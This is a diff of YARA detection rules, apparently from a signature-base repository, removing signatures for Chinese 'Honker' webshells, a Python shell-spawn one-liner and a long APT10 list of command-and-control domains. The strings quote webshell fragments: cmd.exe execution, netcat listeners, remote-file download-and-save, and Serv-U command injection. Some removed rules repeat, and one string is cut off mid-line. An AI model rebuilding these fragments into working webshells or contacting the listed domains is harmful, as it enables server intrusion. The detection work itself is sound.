-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "b9b2107c946431e4ad1a8f5e53ac05e132935c0e"
-		id = "c5670deb-952c-5ba4-949a-097cc09bb108"
-	strings:
-		$s1 = "<cfexecute name=\"C:\\Winnt\\System32\\cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "<form action=\"<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>\" method=\"post\">" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 4KB and all of them
-}
-
-rule CN_Honker_Webshell_PHP_php4 {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file php4.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "179975f632baff6ee4d674fe3fabc324724fee9e"
-		id = "82446dff-dd1e-54a8-bb70-570bedc805b5"
-	strings:
-		$s0 = "nc -l -vv -p port(" ascii /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x4850 and filesize < 1KB and all of them
-}
-
-rule CN_Honker_Webshell_Linux_2_6_Exploit {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file 2.6.9"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "ec22fac0510d0dc2c29d56c55ff7135239b0aeee"
-		id = "22e2aca7-418f-598f-af0c-99942aaf3278"
-	strings:
-		$s0 = "[+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?" fullword ascii
-	condition:
-		filesize < 56KB and all of them
-}
-
-rule CN_Honker_Webshell_ASP_asp2 {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file asp2.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "b3ac478e72a0457798a3532f6799adeaf4a7fc87"
-		id = "e5296405-c345-55dc-acd9-be6aca86c60b"
-	strings:
-		$s1 = "<%=server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "webshell</font> <font color=#00FF00>" fullword ascii /* PEStudio Blacklist: strings */
-		$s3 = "Userpwd = \"admin\"   'User Password" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 10KB and all of them
-}
-
-rule CN_Honker_Webshell_FTP_MYSQL_MSSQL_SSH {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file FTP MYSQL MSSQL SSH.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "fe63b215473584564ef2e08651c77f764999e8ac"
-		id = "dd619901-6f0e-527e-9926-808176641c09"
-	strings:
-		$s1 = "$_SESSION['hostlist'] = $hostlist = $_POST['hostlist'];" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "Codz by <a href=\"http://www.sablog.net/blog\">4ngel</a><br />" fullword ascii
-		$s3 = "if ($conn_id = @ftp_connect($host, $ftpport)) {" fullword ascii /* PEStudio Blacklist: strings */
-		$s4 = "$_SESSION['sshport'] = $mssqlport = $_POST['sshport'];" fullword ascii /* PEStudio Blacklist: strings */
-		$s5 = "<title>ScanPass(FTP/MYSQL/MSSQL/SSH) by 4ngel</title>" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 20KB and 3 of them
-}
-
-rule CN_Honker_Webshell_ASP_shell {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file shell.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "b7b34215c2293ace70fc06cbb9ce73743e867289"
-		id = "fdfc3fc1-9400-533b-978b-1a1fac112e1f"
-	strings:
-		$s1 = "xPost.Open \"GET\",\"http://www.i0day.com/1.txt\",False //" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "sGet.SaveToFile Server.MapPath(\"test.asp\"),2 //" fullword ascii /* PEStudio Blacklist: strings */
-		$s3 = "http://hi.baidu.com/xahacker/fuck.txt" fullword ascii
-	condition:
-		filesize < 1KB and all of them
-}
-
-rule CN_Honker_Webshell_PHP_php7 {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file php7.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "05a3f93dbb6c3705fd5151b6ffb64b53bc555575"
-		id = "f21bb0db-d18a-58c0-a227-5baf5536c57b"
-	strings:
-		$s0 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; }
-
-rule CN_Honker_Webshell__php1_php7_php9 {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - from files php1.txt, php7.txt, php9.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		super_rule = 1
-		hash0 = "c2f4b150f53c78777928921b3a985ec678bfae32"
-		hash1 = "05a3f93dbb6c3705fd5151b6ffb64b53bc555575"
-		hash2 = "cd3962b1dba9f1b389212e38857568b69ca76725"
-		id = "cfc2f624-976f-5ff6-bd07-10948b9290bc"
-	strings:
-		$s1 = "<a href=\"?s=h&o=wscript\">[WScript.shell]</a> " fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "document.getElementById('cmd').value = Str[i];" fullword ascii
-		$s3 = "Str[7] = \"copy c:\\\\\\\\1.php d:\\\\\\\\2.php\";" fullword ascii
-	condition:
-		filesize < 300KB and all of them
-}
-
-rule CN_Honker_Webshell__Serv_U_by_Goldsun_asp3_Serv_U_asp {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - from files Serv-U_by_Goldsun.asp, asp3.txt, Serv-U asp.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		super_rule = 1
-		hash0 = "d4d7a632af65a961a1dbd0cff80d5a5c2b397e8c"
-		hash1 = "87c5a76989bf08da5562e0b75c196dcb3087a27b"
-		hash2 = "cee91cd462a459d31a95ac08fe80c70d2f9c1611"
-		id = "e91e05e8-0f6d-57a7-a649-a834733f17c8"
-	strings:
-		$s1 = "c.send loginuser & loginpass & mt & deldomain & quit" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "loginpass = \"Pass \" & pass & vbCrLf" fullword ascii /* PEStudio Blacklist: strings */
-		$s3 = "b.send \"User go\" & vbCrLf & \"pass od\" & vbCrLf & \"site exec \" & cmd & vbCr" ascii
-	condition:
-		filesize < 444KB and all of them
-}
-
-rule CN_Honker_Webshell__asp4_asp4_MSSQL__MSSQL_ {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - from files asp4.txt, asp4.txt, MSSQL_.asp, MSSQL_.asp"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		super_rule = 1
-		hash0 = "4005b83ced1c032dc657283341617c410bc007b8"
-		hash1 = "4005b83ced1c032dc657283341617c410bc007b8"
-		hash2 = "7097c21f92306983add3b5b29a517204cd6cd819"
-		hash3 = "7097c21f92306983add3b5b29a517204cd6cd819"
-		id = "e0070f0d-35d0-5024-88e7-e0e04b29f485"
-	strings:
-		$s0 = "\"<form name=\"\"searchfileform\"\" action=\"\"?action=searchfile\"\" method=\"" ascii /* PEStudio Blacklist: strings */
-		$s1 = "\"<TD ALIGN=\"\"Left\"\" colspan=\"\"5\"\">[\"& DbName & \"]" fullword ascii
-		$s2 = "Set Conn = Nothing " fullword ascii
-	condition:
-		filesize < 341KB and all of them
-}
-
-rule CN_Honker_Webshell__Injection_jmCook_jmPost_ManualInjection {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - from files Injection.exe, jmCook.asp, jmPost.asp, ManualInjection.exe"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		super_rule = 1
-		hash0 = "3484ed16e6f9e0d603cbc5cb44e46b8b7e775d35"
-		hash1 = "5e1851c77ce922e682333a3cb83b8506e1d7395d"
-		hash2 = "f80ec26bbdc803786925e8e0450ad7146b2478ff"
-		hash3 = "e83d427f44783088a84e9c231c6816c214434526"
-		id = "e154ecb5-9d56-520a-b76a-635a8864f0a8"
-	strings:
-		$s1 = "response.write  PostData(JMUrl,JmStr,JmCok,JmRef)" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "strReturn=Replace(strReturn,chr(43),\"%2B\")  'JMDCW" fullword ascii
-	condition:
-		filesize < 7342KB and all of them
-}
-
-rule CN_Honker_Webshell_cmfshell {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file cmfshell.cmf"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "b9b2107c946431e4ad1a8f5e53ac05e132935c0e"
-		id = "c5670deb-952c-5ba4-949a-097cc09bb108"
-	strings:
-		$s1 = "<cfexecute name=\"C:\\Winnt\\System32\\cmd.exe\"" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "<form action=\"<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>\" method=\"post\">" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 4KB and all of them
-}
-
-rule CN_Honker_Webshell_PHP_php4 {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file php4.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "179975f632baff6ee4d674fe3fabc324724fee9e"
-		id = "82446dff-dd1e-54a8-bb70-570bedc805b5"
-	strings:
-		$s0 = "nc -l -vv -p port(" ascii /* PEStudio Blacklist: strings */
-	condition:
-		uint16(0) == 0x4850 and filesize < 1KB and all of them
-}
-
-rule CN_Honker_Webshell_Linux_2_6_Exploit {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file 2.6.9"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "ec22fac0510d0dc2c29d56c55ff7135239b0aeee"
-		id = "22e2aca7-418f-598f-af0c-99942aaf3278"
-	strings:
-		$s0 = "[+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?" fullword ascii
-	condition:
-		filesize < 56KB and all of them
-}
-
-rule CN_Honker_Webshell_ASP_asp2 {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file asp2.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "b3ac478e72a0457798a3532f6799adeaf4a7fc87"
-		id = "e5296405-c345-55dc-acd9-be6aca86c60b"
-	strings:
-		$s1 = "<%=server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "webshell</font> <font color=#00FF00>" fullword ascii /* PEStudio Blacklist: strings */
-		$s3 = "Userpwd = \"admin\"   'User Password" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 10KB and all of them
-}
-
-rule CN_Honker_Webshell_FTP_MYSQL_MSSQL_SSH {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file FTP MYSQL MSSQL SSH.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "fe63b215473584564ef2e08651c77f764999e8ac"
-		id = "dd619901-6f0e-527e-9926-808176641c09"
-	strings:
-		$s1 = "$_SESSION['hostlist'] = $hostlist = $_POST['hostlist'];" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "Codz by <a href=\"http://www.sablog.net/blog\">4ngel</a><br />" fullword ascii
-		$s3 = "if ($conn_id = @ftp_connect($host, $ftpport)) {" fullword ascii /* PEStudio Blacklist: strings */
-		$s4 = "$_SESSION['sshport'] = $mssqlport = $_POST['sshport'];" fullword ascii /* PEStudio Blacklist: strings */
-		$s5 = "<title>ScanPass(FTP/MYSQL/MSSQL/SSH) by 4ngel</title>" fullword ascii /* PEStudio Blacklist: strings */
-	condition:
-		filesize < 20KB and 3 of them
-}
-
-rule CN_Honker_Webshell_ASP_shell {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file shell.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "b7b34215c2293ace70fc06cbb9ce73743e867289"
-		id = "fdfc3fc1-9400-533b-978b-1a1fac112e1f"
-	strings:
-		$s1 = "xPost.Open \"GET\",\"http://www.i0day.com/1.txt\",False //" fullword ascii /* PEStudio Blacklist: strings */
-		$s2 = "sGet.SaveToFile Server.MapPath(\"test.asp\"),2 //" fullword ascii /* PEStudio Blacklist: strings */
-		$s3 = "http://hi.baidu.com/xahacker/fuck.txt" fullword ascii
-	condition:
-		filesize < 1KB and all of them
-}
-
-rule CN_Honker_Webshell_PHP_php7 {
-	meta:
-		description = "Webshell from CN Honker Pentest Toolset - file php7.txt"
-		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-		author = "Florian Roth (Nextron Systems)"
-		reference = "Disclosed CN Honker Pentest Toolset"
-		date = "2015-06-23"
-		score = 70
-		hash = "05a3f93dbb6c3705fd5151b6ffb64b53bc555575"
-		id = "f21bb0db-d18a-58c0-a227-5baf5536c57b"
-	strings:
-		$s0 = "---> '.$ports[$i].'<br>'; ob_flush(); flush(); } }
 
 rule CN_Honker_Webshell_ASP_shell {
 	meta:
@@ -19711,20 +19269,6 @@ rule APT_MAL_UNC4841_SEASPY_Jun23_1 {
       and filesize < 9000KB
       and 3 of them
       or 5 of them
-}
-
-rule SUSP_PY_Shell_Spawn_Jun23_1 : SCRIPT {
-   meta:
-      description = "Detects suspicious one-liner to spawn a shell using Python"
-      author = "Florian Roth"
-      reference = "https://www.mandiant.com/resources/blog/barracuda-esg-exploited-globally"
-      date = "2023-06-15"
-      score = 70
-      id = "15fd2c9a-c425-5d4d-9209-fd3826074d6c"
-   strings:
-      $x1 = "python -c import pty;pty.spawn(\"/bin/" ascii
-   condition:
-      1 of them
 }
 
 rule APT_MAL_LNX_Hunting_Linux_WHIRLPOOL_1 {
@@ -20258,1380 +19802,6 @@ rule Oilrig_PS_CnC {
       $s2 = "$hostname = \"D\" + $fileID + (-join ((65..90) + (48..57) + (97..122)|" ascii
    condition:
       filesize < 40KB and 1 of them
-}
-
-rule APT10_Malware_Sample_Gen : FILE {
-   meta:
-      description = "APT 10 / Cloud Hopper malware campaign"
-      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
-      author = "Florian Roth (Nextron Systems)"
-      reference = "https://www.pwc.co.uk/issues/cyber-security-data-privacy/insights/operation-cloud-hopper.html"
-      date = "2017-04-06"
-      score = 80
-   strings:
-      $c2_1 = "002562066559681.r3u8.com" ascii
-      $c2_2 = "031168053846049.r3u8.com" ascii
-      $c2_3 = "0625.have8000.com" ascii
-      $c2_4 = "1.gadskysun.com" ascii
-      $c2_5 = "100fanwen.com" ascii
-      $c2_6 = "11.usyahooapis.com" ascii
-      $c2_7 = "19518473326.r3u8.com" ascii
-      $c2_8 = "1960445709311199.r3u8.com" ascii
-      $c2_9 = "1j.www1.biz" ascii
-      $c2_10 = "1z.itsaol.com" ascii
-      $c2_11 = "2012yearleft.com" ascii
-      $c2_12 = "2014.zzux.com" ascii
-      $c2_13 = "202017845.r3u8.com" ascii
-      $c2_14 = "2139465544784.r3u8.com" ascii
-      $c2_15 = "2789203959848958.r3u8.com" ascii
-      $c2_16 = "5590428449750026.r3u8.com" ascii
-      $c2_17 = "5q.niushenghuo.info" ascii
-      $c2_18 = "6r.suibian2010.info" ascii
-      $c2_19 = "9gowg.tech" ascii
-      $c2_20 = "Hamiltion.catholicmmb.com" ascii
-      $c2_21 = "a.wubangtu.info" ascii
-      $c2_22 = "a1.suibian2010.info" ascii
-      $c2_24 = "abc.wikaba.com" ascii
-      $c2_25 = "abcd120719.6600.org" ascii
-      $c2_26 = "abcd120807.3322.org" ascii
-      $c2_27 = "acc.emailfound.info" ascii
-      $c2_28 = "acc.lehigtapp.com" ascii
-      $c2_29 = "acsocietyy.com" ascii
-      $c2_31 = "ad.webbooting.com" ascii
-      $c2_32 = "additional.sexidude.com" ascii
-      $c2_33 = "af.zyns.com" ascii
-      $c2_34 = "afc.https443.org" ascii
-      $c2_35 = "ako.ddns.us" ascii
-      $c2_36 = "androidmusicapp.onmypc.us" ascii
-      $c2_37 = "announcements.toythieves.com" ascii
-      $c2_38 = "anvprn.com" ascii
-      $c2_39 = "aotuo.9966.org" ascii
-      $c2_40 = "apec.qtsofta.com" ascii
-      $c2_41 = "app.lehigtapp.com" ascii
-      $c2_42 = "apple.cmdnetview.com" ascii
-      $c2_43 = "apple.defensewar.org" ascii
-      $c2_44 = "apple.ikwb.com" ascii
-      $c2_45 = "appledownload.ourhobby.com" ascii
-      $c2_46 = "appleimages.itemdb.com" ascii
-      $c2_47 = "appleimages.longmusic.com" ascii
-      $c2_48 = "applelib120102.9966.org" ascii
-      $c2_49 = "applemirror.organiccrap.com" ascii
-      $c2_50 = "applemirror.squirly.info" ascii
-      $c2_51 = "applemusic.isasecret.com" ascii
-      $c2_52 = "applemusic.itemdb.com" ascii
-      $c2_53 = "applemusic.wikaba.com" ascii
-      $c2_54 = "applemusic.xxuz.com" ascii
-      $c2_55 = "applemusic.zzux.com" ascii
-      $c2_56 = "apples.sytes.net" ascii
-      $c2_57 = "appleupdate.itemdb.com" ascii
-      $c2_58 = "architectisusa.com" ascii
-      $c2_59 = "area.wthelpdesk.com" ascii
-      $c2_60 = "army.xxuz.com" ascii
-      $c2_61 = "art.p6p6.net" ascii
-      $c2_62 = "asfzx.x24hr.com" ascii
-      $c2_64 = "availab.wikaba.com" ascii
-      $c2_65 = "availability.justdied.com" ascii
-      $c2_66 = "ba.my03.com" ascii
-      $c2_67 = "baby.macforlinux.net" ascii
-      $c2_68 = "baby.myie12.com" ascii
-      $c2_69 = "baby.usmirocomney.net" ascii
-      $c2_70 = "back.jungleheart.com" ascii
-      $c2_71 = "back.mofa.dynamic-dns.net" ascii
-      $c2_72 = "bak.have8000.com" ascii
-      $c2_73 = "bak.ignorelist.com" ascii
-      $c2_74 = "bak.un.dnsrd.com" ascii
-      $c2_75 = "balance1.wikaba.com" ascii
-      $c2_76 = "balk.n7go.com" ascii
-      $c2_77 = "banana.cmdnetview.com" ascii
-      $c2_78 = "barrybaker.6600.org" ascii
-      $c2_79 = "bbs.jungleheart.com" ascii
-      $c2_80 = "bdoncloud.com" ascii
-      $c2_81 = "be.mrslove.com" ascii
-      $c2_82 = "be.yourtrap.com" ascii
-      $c2_83 = "belowto.com" ascii
-      $c2_84 = "bethel.webhop.net" ascii
-      $c2_85 = "bexm.cleansite.biz" ascii
-      $c2_86 = "bezu.itemdb.com" ascii
-      $c2_87 = "bk56.twilightparadox.com" ascii
-      $c2_88 = "blaaaaaaaaaaaa.windowsupdate.3-a.net" ascii
-      $c2_89 = "blog.defensewar.org" ascii
-      $c2_90 = "brand.fartit.com" ascii
-      $c2_91 = "bridgeluxlightmadness.com" ascii
-      $c2_92 = "bulletproof.squirly.info" ascii
-      $c2_93 = "cao.p6p6.net" ascii
-      $c2_94 = "cata.qtsofta.com" ascii
-      $c2_95 = "catholicmmb.com" ascii
-      $c2_96 = "cc.dynamicdns.co.uk" ascii
-      $c2_97 = "ccfchrist.com" ascii
-      $c2_98 = "ccupdatedata.authorizeddns.net" ascii
-      $c2_99 = "cd.usyahooapis.com" ascii
-      $c2_100 = "cdn.incloud-go.com" ascii
-      $c2_101 = "center.shenajou.com" ascii
-      $c2_102 = "cgei493860.r3u8.com" ascii
-      $c2_103 = "chaindungeons.com" ascii
-      $c2_104 = "chibashiri.com" ascii
-      $c2_105 = "childrenstow.com" ascii
-      $c2_106 = "cia.ezua.com" ascii
-      $c2_107 = "cia.toh.info" ascii
-      $c2_108 = "ciaoci.chickenkiller.com" ascii
-      $c2_109 = "civilwar123.authorizeddns.org" ascii
-      $c2_110 = "civilwar520.onmypc.org" ascii
-      $c2_111 = "ckusshani.com" ascii
-      $c2_112 = "cloud-kingl.com" ascii
-      $c2_113 = "cloud-maste.com" ascii
-      $c2_114 = "cloudns.8800.org" ascii
-      $c2_115 = "cmdnetview.com" ascii
-      $c2_116 = "cms.sindeali.com" ascii
-      $c2_117 = "cnnews.mylftv.com" ascii
-      $c2_118 = "commissioner.shenajou.com" ascii
-      $c2_119 = "commons.onedumb.com" ascii
-      $c2_120 = "contactus.myddns.com" ascii
-      $c2_121 = "contactus.onmypc.us" ascii
-      $c2_122 = "contract.4mydomain.com" ascii
-      $c2_123 = "contractus.qpoe.com" ascii
-      $c2_124 = "contractus.zzux.com" ascii
-      $c2_125 = "coreck.suayay.com" ascii
-      $c2_128 = "ctdl.windowsupdate.itsaol.com" ascii
-      $c2_129 = "ctdl.windowsupdate.nsatcdns.com" ascii
-      $c2_130 = "ctldl.appledownload.ourhobby.com" ascii
-      $c2_131 = "ctldl.applemusic.itemdb.com" ascii
-      $c2_132 = "ctldl.itunesmusic.jkub.com" ascii
-      $c2_133 = "ctldl.microsoftmusic.onedumb.com" ascii
-      $c2_134 = "ctldl.microsoftupdate.qhigh.com" ascii
-      $c2_135 = "ctldl.windowsupdate.authorizeddns.org" ascii
-      $c2_136 = "ctldl.windowsupdate.authorizeddns.us" ascii
-      $c2_137 = "ctldl.windowsupdate.dnset.com" ascii
-      $c2_138 = "ctldl.windowsupdate.esmtp.biz" ascii
-      $c2_139 = "ctldl.windowsupdate.ezua.com" ascii
-      $c2_140 = "ctldl.windowsupdate.gettrials.com" ascii
-      $c2_141 = "ctldl.windowsupdate.itsaol.com" ascii
-      $c2_142 = "ctldl.windowsupdate.lflinkup.com" ascii
-      $c2_143 = "ctldl.windowsupdate.mrface.com" ascii
-      $c2_144 = "ctldl.windowsupdate.nsatcdns.com" ascii
-      $c2_145 = "ctldl.windowsupdate.organiccrap.com" ascii
-      $c2_146 = "ctldl.windowsupdate.x24hr.com" ascii
-      $c2_147 = "cvnx.zyns.com" ascii
-      $c2_148 = "cwiinatonal.com" ascii
-      $c2_149 = "daddy.gostudyantivirus.com" ascii
-      $c2_150 = "dcc.jimingroup.com" ascii
-      $c2_151 = "dd.ddns.us" ascii
-      $c2_152 = "de.onmypc.info" ascii
-      $c2_153 = "dear.loveddos.com" ascii
-      $c2_154 = "dec.seyesb.acmetoy.com" ascii
-      $c2_155 = "dedgesuite.net" ascii
-      $c2_156 = "dedydns.ns01.us" ascii
-      $c2_157 = "defensewar.org" ascii
-      $c2_158 = "demoones.com" ascii
-      $c2_159 = "department.shenajou.com" ascii
-      $c2_160 = "details.squirly.info" ascii
-      $c2_161 = "development.shenajou.com" ascii
-      $c2_162 = "devilcase.acmetoy.com" ascii
-      $c2_163 = "dfgwerzc.3322.org" ascii
-      $c2_164 = "dick.ccfchrist.com" ascii
-      $c2_165 = "digsby.ourhobby.com" ascii
-      $c2_166 = "disruptive.https443.net" ascii
-      $c2_167 = "dlmix.ourdvs.com" ascii
-      $c2_168 = "dnspoddwg.authorizeddns.org" ascii
-      $c2_170 = "document.methoder.com" ascii
-      $c2_171 = "document.shenajou.com" ascii
-      $c2_172 = "domainnow.yourtrap.com" ascii
-      $c2_173 = "download.applemusic.itemdb.com" ascii
-      $c2_174 = "download.microsoftmusic.onedumb.com" ascii
-      $c2_175 = "download.windowsupdate.authorizeddns.org" ascii
-      $c2_176 = "download.windowsupdate.dedgesuite.net" ascii
-      $c2_177 = "download.windowsupdate.dnset.com" ascii
-      $c2_178 = "download.windowsupdate.itsaol.com" ascii
-      $c2_179 = "download.windowsupdate.lflinkup.com" ascii
-      $c2_180 = "download.windowsupdate.nsatcdns.com" ascii
-      $c2_181 = "download.windowsupdate.x24hr.com" ascii
-      $c2_182 = "downloadlink.mypicture.info" ascii
-      $c2_183 = "drives.methoder.com" ascii
-      $c2_184 = "dst.1dumb.com" ascii
-      $c2_185 = "duosay.com" ascii
-      $c2_186 = "dyncojinf.6600.org" ascii
-      $c2_187 = "dynsbluecheck.7766.org" ascii
-      $c2_188 = "ea.onmypc.info" ascii
-      $c2_189 = "ea.rebatesrule.net" ascii
-      $c2_190 = "edgar.ccfchrist.com" ascii
-      $c2_191 = "ehshiroshima.mylftv.com" ascii
-      $c2_192 = "emailfound.info" ascii
-      $c2_193 = "eric-averyanov.wha.la" ascii
-      $c2_194 = "essashi.com" ascii
-      $c2_195 = "eu.acmetoy.com" ascii
-      $c2_196 = "eu.wha.la" ascii
-      $c2_197 = "eu.zzux.com" ascii
-      $c2_198 = "everydayfilmlink.com" ascii
-      $c2_199 = "ewe.toshste.com" ascii
-      $c2_200 = "eweek.2waky.com" ascii
-      $c2_201 = "exprenum.com" ascii
-      $c2_202 = "express.lflinkup.com" ascii
-      $c2_203 = "extraordinary.dynamic-dns.net" ascii
-      $c2_204 = "f068v.site" ascii
-      $c2_205 = "fabian.ccfchrist.com" ascii
-      $c2_206 = "fastemail.dnsrd.com" ascii
-      $c2_207 = "fastmail2.com" ascii
-      $c2_208 = "fbi.sexxxy.biz" ascii
-      $c2_209 = "fbi.zyns.com" ascii
-      $c2_210 = "fcztqbg.zj.r3u8.com" ascii
-      $c2_211 = "feed.jungleheart.com" ascii
-      $c2_212 = "fftpoor.com" ascii
-      $c2_213 = "fg.v4.download.windowsupdates.dnsrd.com" ascii
-      $c2_214 = "fgipv6.download.windowsupdate.com.mwcname.com" ascii
-      $c2_215 = "file.zzux.com" ascii
-      $c2_216 = "files.architectisusa.com" ascii
-      $c2_217 = "film.everydayfilmlink.com" ascii
-      $c2_218 = "filmlist.everydayfilmlink.com" ascii
-      $c2_219 = "findme.epac.to" ascii
-      $c2_220 = "fire.mrface.com" ascii
-      $c2_221 = "fish.toh.info" ascii
-      $c2_222 = "fiveavmersi.websegoo.net" ascii
-      $c2_223 = "fjs.wikaba.com" ascii
-      $c2_224 = "flea.poulsenv.com" ascii
-      $c2_225 = "flynews.edns.biz" ascii
-      $c2_226 = "fo.mysecondarydns.com" ascii
-      $c2_227 = "foal.wchildress.com" ascii
-      $c2_228 = "follow.wha.la" ascii
-      $c2_229 = "foo.shenajou.com" ascii
-      $c2_230 = "for.ddns.mobi" ascii
-      $c2_231 = "fr.wikaba.com" ascii
-      $c2_232 = "franck.demoones.com" ascii
-      $c2_233 = "ftp.2014.zzux.com" ascii
-      $c2_234 = "ftp.additional.sexidude.com" ascii
-      $c2_235 = "ftp.afc.https443.org" ascii
-      $c2_236 = "ftp.announcements.toythieves.com" ascii
-      $c2_237 = "ftp.apple.ikwb.com" ascii
-      $c2_238 = "ftp.appledownload.ourhobby.com" ascii
-      $c2_239 = "ftp.appleimages.itemdb.com" ascii
-      $c2_240 = "ftp.appleimages.longmusic.com" ascii
-      $c2_241 = "ftp.appleimages.organiccrap.com" ascii
-      $c2_242 = "ftp.applemirror.organiccrap.com" ascii
-      $c2_243 = "ftp.applemirror.squirly.info" ascii
-      $c2_244 = "ftp.applemusic.isasecret.com" ascii
-      $c2_245 = "ftp.applemusic.itemdb.com" ascii
-      $c2_246 = "ftp.applemusic.wikaba.com" ascii
-      $c2_247 = "ftp.applemusic.xxuz.com" ascii
-      $c2_248 = "ftp.applemusic.zzux.com" ascii
-      $c2_249 = "ftp.appleupdate.itemdb.com" ascii
-      $c2_250 = "ftp.architectisusa.com" ascii
-      $c2_251 = "ftp.asfzx.x24hr.com" ascii
-      $c2_252 = "ftp.availab.wikaba.com" ascii
-      $c2_253 = "ftp.availability.justdied.com" ascii
-      $c2_254 = "ftp.back.jungleheart.com" ascii
